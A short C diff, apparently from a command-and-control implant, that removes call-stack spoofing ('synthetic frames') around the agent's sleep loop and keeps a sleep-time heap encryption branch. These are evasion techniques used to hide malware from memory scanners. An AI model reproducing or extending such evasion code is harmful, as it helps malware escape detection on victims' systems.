@@ -983,9 +983,6 @@ do_sleep:
             }
             if (s < 500) s = 500;
 
-#if ENABLE_SYNTHETIC_FRAMES
-            synth_frames_push();
-#endif
 #if ENABLE_SLEEP_ENCRYPT
             if (g_agent_id[0]) {
                 heap_key_init();
@@ -995,9 +992,6 @@ do_sleep:
             }
 #else
             Sleep((DWORD)s);
-#endif
-#if ENABLE_SYNTHETIC_FRAMES
-            synth_frames_pop();
 #endif
         }
     }
